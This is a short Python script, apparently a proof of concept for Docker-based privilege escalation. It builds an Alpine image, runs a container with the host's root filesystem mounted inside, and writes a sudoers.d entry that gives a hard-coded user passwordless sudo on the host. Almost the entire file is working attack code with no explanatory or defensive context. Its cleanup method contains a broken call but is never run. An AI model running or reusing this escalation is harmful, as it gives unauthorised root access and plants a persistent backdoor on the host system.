import subprocess, time

files = {
    "docker_file": """
ENV WORKDIR /privesc
RUN mkdir -p $WORKDIR
VOLUME $WORKDIR
WORKDIR $WORKDIR""",
         }

class HostWrite:
    def __init__(self, trigger_time=5, workdir="privesc", image="priv_container", container="ESCAPE_PRIVESC", username="testuser"):
        self.trigger_time = trigger_time
        self.workdir = workdir
        self.image = image
        self.container = container
        self.username = username
        dockerfile = open("Dockerfile", "w+")
        dockerfile.write("FROM alpine\n")
        dockerfile.write("ENV WORKDIR /{}\n".format(workdir))
        dockerfile.write("RUN mkdir -p $WORKDIR\n")
        dockerfile.write("VOLUME $WORKDIR\n")
        dockerfile.write("WORKDIR $WORKDIR\n")
        dockerfile.close()
        subprocess.run(["docker", "build", "-t", image, "."])
    
    def trigger_in(self, in_sec=0, kill_in_sec=0):
        # time.sleep(in_sec)
        subprocess.run('docker run --name {} -v /:/{} -dit {} /bin/sh'.format(self.container, self.workdir, self.image).split())
        # time.sleep(self.trigger_time)
        
        subprocess.run(['docker', 'exec', self.container, 'sh', '-c', 'echo "{} ALL=(ALL) NOPASSWD: ALL" > /{}/etc/sudoers.d/010_{}-nopasswd'.format(self.username, self.workdir, self.username)])
        # time.sleep(kill_in_sec)

    def cleanup(self, in_sec=0):
        time.sleep(in_sec=0)
        subprocess.run(["docker", "image", "rm", self.image])


hw = HostWrite(username="kmajdi")
hw.trigger_in()

